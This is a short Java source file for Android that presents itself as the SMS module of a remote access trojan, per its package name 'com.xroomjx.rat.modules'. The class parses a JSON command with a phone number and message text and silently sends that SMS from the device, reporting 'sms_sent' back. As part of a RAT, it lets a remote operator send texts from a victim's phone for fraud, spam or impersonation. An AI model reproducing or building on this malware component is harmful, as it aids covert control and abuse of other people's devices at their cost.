package com.xroomjx.rat.modules;

import android.telephony.SmsManager;

public class SMSManager {
    public static String send(String args) {
        try {
            org.json.JSONObject json = new org.json.JSONObject(args);
            String number = json.getString("number");
            String message = json.getString("message");
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, message, null, null);
            return "sms_sent";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
